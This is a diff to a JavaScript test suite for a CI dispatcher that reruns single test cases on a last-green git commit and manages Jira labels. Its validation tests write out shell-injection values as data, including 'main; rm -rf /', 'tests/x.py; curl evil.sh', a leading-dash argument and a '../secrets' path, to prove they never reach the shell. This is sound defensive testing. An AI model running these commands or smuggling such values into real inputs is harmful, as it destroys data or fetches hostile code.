@@ -53,9 +53,9 @@ function parkedFinding(tcKey, opts) {
         reason: 'rerun-requested-on-last-green-build',
         errorClass: opts.errorClass || 'assertion',
         testPath: opts.testPath || ('testing/tests/' + tcKey + '/test.py'),
-        sha: opts.sha || 'sha-new',
+        sha: opts.sha || 'cafed00dbee',
         envFingerprint: opts.envFingerprint || null,
-        lastGreenSha: opts.lastGreenSha !== undefined ? opts.lastGreenSha : 'sha-green',
+        lastGreenSha: opts.lastGreenSha !== undefined ? opts.lastGreenSha : 'facade12345',
         lastGreenEnvFingerprint: opts.lastGreenEnvFingerprint || null,
         occurrences: opts.occurrences || 1
     };
@@ -221,13 +221,13 @@ suite('tcDifferentialDispatcher: green-on-old — the earned bounce', function()
 
         // the scripted run: fetch → checkout the SHA → run the single TC → restore
         var cmds = shell.calls.map(function(c) { return c.command; });
-        assert.contains(cmds.join('\n'), 'git -C /repo fetch origin sha-green');
-        assert.contains(cmds.join('\n'), 'git -C /repo checkout sha-green');
+        assert.contains(cmds.join('\n'), 'git -C /repo fetch origin facade12345');
+        assert.contains(cmds.join('\n'), 'git -C /repo checkout facade12345');
         assert.contains(cmds.join('\n'), 'pytest testing/tests/TS-7/test.py');
         assert.contains(cmds.join('\n'), 'git -C /repo checkout bug-test-branch');
-        var checkoutIdx = cmds.map(function(c) { return c.indexOf('checkout sha-green') !== -1; }).indexOf(true);
+        var checkoutIdx = cmds.map(function(c) { return c.indexOf('checkout facade12345') !== -1; }).indexOf(true);
         var runIdx = cmds.map(function(c) { return c.indexOf('pytest') !== -1; }).indexOf(true);
-        var restoreIdx = cmds.map(function(c) { return c.indexOf('checkout bug-test-branch') !== -1 && c.indexOf('sha-green') === -1; }).indexOf(true);
+        var restoreIdx = cmds.map(function(c) { return c.indexOf('checkout bug-test-branch') !== -1 && c.indexOf('facade12345') === -1; }).indexOf(true);
         assert.ok(checkoutIdx !== -1 && runIdx !== -1 && restoreIdx !== -1, 'checkout → run → restore in order');
         assert.ok(checkoutIdx < runIdx && runIdx < restoreIdx);
 
@@ -338,7 +338,7 @@ suite('tcDifferentialDispatcher: unavailable — the stall stays visible', funct
     });
 
     test('a checkout failure is unavailable, not a red verdict', function() {
-        var shell = fakeShell({ throwsOn: ['checkout sha-green'] });
+        var shell = fakeShell({ throwsOn: ['checkout facade12345'] });
         var run = runAction(shell, [parkedFinding('TS-7')]);
         assert.equal(run.result.action, 'stalled');
         assert.deepEqual(run.jira.moves, []);
@@ -353,7 +353,7 @@ suite('tcDifferentialDispatcher: unavailable — the stall stays visible', funct
     });
 
     test('a REPEAT unavailable attempt posts no new comment (spam bound)', function() {
-        var run = runAction(fakeShell({ tcFails: false, throwsOn: ['checkout sha-green'] }),
+        var run = runAction(fakeShell({ tcFails: false, throwsOn: ['checkout facade12345'] }),
             [parkedFinding('TS-7', { occurrences: 2 })]);
         var bodyComments = run.jira.comments.map(function(c) { return c.comment; })
             .filter(function(b) { return String(b).indexOf('dmtools:tc-maintenance-ledger') === -1; });
@@ -413,5 +413,229 @@ suite('tcDifferentialDispatcher: nothing parked', function() {
         assert.equal(run.result.action, 'nothing_parked');
         assert.deepEqual(run.jira.moves, []);
         assert.deepEqual(run.jira.unlabels, [{ key: 'BUG-1', label: 'tc_differential_pending' }]);
+    });
+});
+
+// ── gh-1346 rework: the dispatcher manages its own trigger label ─────────────
+
+var TRIGGER_LABEL = 'sm_tc_differential_triggered';
+
+/** One shared-jira dispatch: returns { result, jira, shell } for follow-ups. */
+function dispatchOnce(shell, findings, opts) {
+    opts = opts || {};
+    var jira = {
+        jira_get_ticket: function(args) {
+            return { fields: {
+                summary: 'Checkout total wrong',
+                issuetype: { name: 'Bug' },
+                comment: { comments: ticketComments({ findings: findings, redRounds: opts.redRounds }) }
+            } };
+        },
+        jira_move_to_status: function(args) { jira.moves.push(args); },
+        jira_post_comment: function(args) { jira.comments.push(args); },
+        jira_add_label: function(args) { jira.labels.push(args); },
+        jira_remove_label: function(args) { jira.unlabels.push(args); }
+    };
+    jira.moves = []; jira.comments = []; jira.labels = []; jira.unlabels = [];
+    var mod = loadDispatcher(shell, jira, opts.config);
+    return { result: mod.action(dispatcherParams()), jira: jira, shell: shell, mod: mod };
+}
+
+function labelNames(jira) {
+    return jira.unlabels.map(function(u) { return u.label; }).sort();
+}
+
+suite('tcDifferentialDispatcher: trigger label lifecycle (the job lifts its own lock)', function() {
+
+    test('a fully consumed dispatch removes the park label AND the trigger label', function() {
+        var run = dispatchOnce(fakeShell({}), [parkedFinding('TS-7')]);
+        assert.equal(run.result.action, 'bounced');
+        assert.deepEqual(labelNames(run.jira), ['sm_tc_differential_triggered', 'tc_differential_pending'],
+            'the job manages the trigger label full lifecycle (quotaParkProbe.liftPark pattern)');
+    });
+
+    test('nothing_parked also clears the trigger label', function() {
+        var run = dispatchOnce(fakeShell({}), [parkedFinding('TS-3', { role: null })].map(function(f) {
+            return Object.assign({}, f, { verdict: 'rework', reason: 'fresh-tc-first-run-validation' });
+        }));
+        assert.equal(run.result.action, 'nothing_parked');
+        assert.deepEqual(labelNames(run.jira), ['sm_tc_differential_triggered', 'tc_differential_pending']);
+    });
+
+    test('a second park on the same bug dispatches again (the lock does not persist)', function() {
+        // Round 1: TS-7 parked and consumed — the job lifts both labels.
+        var shell1 = fakeShell({});
+        var round1 = dispatchOnce(shell1, [parkedFinding('TS-7')]);
+        assert.equal(round1.result.action, 'bounced');
+        assert.contains(shell1.calls.map(function(c) { return c.command; }).join('\n'),
+            'testing/tests/TS-7/test.py');
+
+        // Round 2: the automation leg parks a NEW request on the same bug and
+        // the SM rule re-adds its trigger label — the dispatcher must run
+        // again (a stale trigger label would skip this tick forever).
+        var jira = round1.jira;
+        jira.comments.push(Object.assign({}, ALLOWED_AUTHOR, { body: ledgerMarkerWith([parkedFinding('TS-9')]) }));
+        var shell2 = fakeShell({});
+        var mod = loadDispatcher(shell2, jira, {});
+        var result = mod.action(dispatcherParams());
+        assert.equal(result.action, 'bounced');
+        assert.contains(shell2.calls.map(function(c) { return c.command; }).join('\n'),
+            'testing/tests/TS-9/test.py', 'the second round really dispatched');
+        assert.contains(labelNames(jira).join(','), 'tc_differential_pending');
+    });
+
+    test('requests still parked after the tick keep BOTH labels (in-flight guard for the retry)', function() {
+        var findings = [];
+        for (var i = 1; i <= 12; i++) findings.push(parkedFinding('TS-' + i));
+        var run = dispatchOnce(fakeShell({}), findings);
+        assert.equal(run.result.action, 'bounced');
+        assert.equal(run.result.deferred, 2);
+        // the park label stays (existing contract) and the trigger label stays —
+        // the next tick must be able to run again for the deferred requests
+        assert.deepEqual(run.jira.unlabels, []);
+    });
+});
+
+// ── gh-1346 rework: unconfigured machineAuthor — fail-safe bail ──────────────
+
+suite('tcDifferentialDispatcher: unconfigured machineAuthor allowlist', function() {
+
+    function unconfiguredParams() {
+        var params = dispatcherParams();
+        delete params.jobParams.machineAuthor;
+        return params;
+    }
+
+    test('an empty allowlist bails unconfigured_parked and touches NOTHING on the ticket', function() {
+        var shell = fakeShell({});
+        var jira = {
+            jira_get_ticket: function() {
+                return { fields: { issuetype: { name: 'Bug' },
+                    comment: { comments: ticketComments({ findings: [parkedFinding('TS-7')] }) } } };
+            },
+            jira_move_to_status: function(args) { jira.moves.push(args); },
+            jira_post_comment: function(args) { jira.comments.push(args); },
+            jira_remove_label: function(args) { jira.unlabels.push(args); }
+        };
+        jira.moves = []; jira.comments = []; jira.unlabels = [];
+        var mod = loadDispatcher(shell, jira, {});
+        var result = mod.action(unconfiguredParams());
+
+        assert.equal(result.success, true);
+        assert.equal(result.action, 'unconfigured_parked');
+        // the fail-closed parse cannot see the parked request — stripping the
+        // park label would orphan it and re-open the generator leg
+        assert.deepEqual(jira.unlabels, [], 'no label is stripped');
+        assert.deepEqual(jira.moves, []);
+        assert.deepEqual(jira.comments, [], 'no ledger marker / report is posted');
+        assert.equal(shell.calls.length, 0, 'nothing was executed');
+    });
+
+    test('a config-level machineAuthor satisfies the guard and dispatches normally', function() {
+        var params = unconfiguredParams();
+        var shell = fakeShell({});
+        var jira = {
+            jira_get_ticket: function() {
+                return { fields: { issuetype: { name: 'Bug' },
+                    comment: { comments: ticketComments({ findings: [parkedFinding('TS-7')] }) } } };
+            },
+            jira_move_to_status: function(args) { jira.moves.push(args); },
+            jira_post_comment: function(args) { jira.comments.push(args); },
+            jira_remove_label: function(args) { jira.unlabels.push(args); }
+        };
+        jira.moves = []; jira.comments = []; jira.unlabels = [];
+        var mod = loadDispatcher(shell, jira, { machineAuthor: 'ai-teammate' });
+        var result = mod.action(params);
+        assert.equal(result.action, 'bounced', 'config.machineAuthor is the second resolution channel');
+    });
+
+    test('a jobParams machineAuthor satisfies the guard (the factory setup channel)', function() {
+        var run = dispatchOnce(fakeShell({}), [parkedFinding('TS-7')]);
+        assert.equal(run.result.action, 'bounced');
+    });
+});
+
+// ── gh-1346 rework: ledger-controlled strings never reach the shell ──────────
+
+suite('tcDifferentialDispatcher: sha/testPath validation before any shell command', function() {
+
+    var validationMod = loadDispatcher(fakeShell(), {});
+
+    test('a non-SHA lastGreenSha is unavailable — nothing is executed', function() {
+        var shell = fakeShell({});
+        var run = runAction(shell, [parkedFinding('TS-7', { lastGreenSha: 'main; rm -rf /' })]);
+        assert.equal(run.result.action, 'stalled');
+        assert.deepEqual(run.jira.moves, []);
+        var cmds = shell.calls.map(function(c) { return c.command; }).join('\n');
+        assert.equal(cmds.indexOf('rm -rf'), -1, 'the injected string never reached the shell');
+        var body = run.jira.comments.map(function(c) { return c.comment; }).join('\n');
+        assert.contains(body, 'could not run');
+    });
+
+    test('a leading-dash lastGreenSha is unavailable (git argument injection)', function() {
+        var shell = fakeShell({});
+        var run = runAction(shell, [parkedFinding('TS-7', { lastGreenSha: '-rf' })]);
+        assert.equal(run.result.action, 'stalled');
+        assert.equal(shell.calls.map(function(c) { return c.command; }).join('\n').indexOf('checkout'), -1,
+            'no checkout was attempted');
+    });
+
+    test('a testPath with shell metacharacters is unavailable', function() {
+        var shell = fakeShell({});
+        var run = runAction(shell, [parkedFinding('TS-7', { testPath: 'tests/x.py; curl evil.sh' })]);
+        assert.equal(run.result.action, 'stalled');
+        var cmds = shell.calls.map(function(c) { return c.command; }).join('\n');
+        assert.equal(cmds.indexOf('curl'), -1, 'the injected command never reached the shell');
+        assert.equal(cmds.indexOf('pytest'), -1, 'no TC run was attempted');
+    });
+
+    test('a relative-escape or option-like testPath is unavailable', function() {
+        var shell = fakeShell({});
+        var run = runAction(shell, [
+            parkedFinding('TS-7', { testPath: '../secrets/test.py' }),
+            parkedFinding('TS-8', { testPath: '-v' })
+        ]);
+        assert.equal(run.result.action, 'stalled');
+        var cmds = shell.calls.map(function(c) { return c.command; }).join('\n');
+        assert.equal(cmds.indexOf('pytest'), -1);
+        // both requests stay parked with a bumped occurrence count
+        assert.equal(tcLedger.differentialRequests(run.latestLedger).length, 2);
+    });
+
+    test('safeSha / safeTestPath accept exactly the legitimate shapes', function() {
+        assert.equal(validationMod.safeSha('facade12345'), 'facade12345');
+        assert.equal(validationMod.safeSha('ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789'), null, '65 hex chars');
+        assert.equal(validationMod.safeSha('facade1'), 'facade1');
+        assert.equal(validationMod.safeSha('facad'), null, 'shorter than 7');
+        assert.equal(validationMod.safeSha('main'), null);
+        assert.equal(validationMod.safeSha(null), null);
+        assert.equal(validationMod.safeTestPath('testing/tests/TS-7/test.py'), 'testing/tests/TS-7/test.py');
+        assert.equal(validationMod.safeTestPath('-v'), null);
+        assert.equal(validationMod.safeTestPath('a b/test.py'), null);
+        assert.equal(validationMod.safeTestPath('a;id/test.py'), null);
+        assert.equal(validationMod.safeTestPath('../x.py'), null);
+        assert.equal(validationMod.safeTestPath(null), null);
+    });
+});
+
+// ── gh-1346 rework: the per-tick cap is visible in the report ────────────────
+
+suite('tcDifferentialDispatcher: per-tick cap observability', function() {
+
+    test('a report states how many parked requests the cap defers', function() {
+        var findings = [];
+        for (var i = 1; i <= 12; i++) findings.push(parkedFinding('TS-' + i));
+        var run = runAction(fakeShell({}), findings);
+
+        assert.equal(run.result.deferred, 2);
+        var body = run.jira.comments.map(function(c) { return c.comment; }).join('\n');
+        assert.contains(body, '10-request-per-tick cap: 2 parked request(s) deferred to the next tick.');
+        // only the bounded subset was dispatched
+        var runCmds = run.shell.calls.map(function(c) { return c.command; }).filter(function(c) {
+            return c.indexOf('pytest') !== -1;
+        });
+        assert.equal(runCmds.length, 10);
+        // the deferred two stay parked in the ledger digest
+        assert.equal(tcLedger.differentialRequests(run.latestLedger).length, 2);
     });
 });
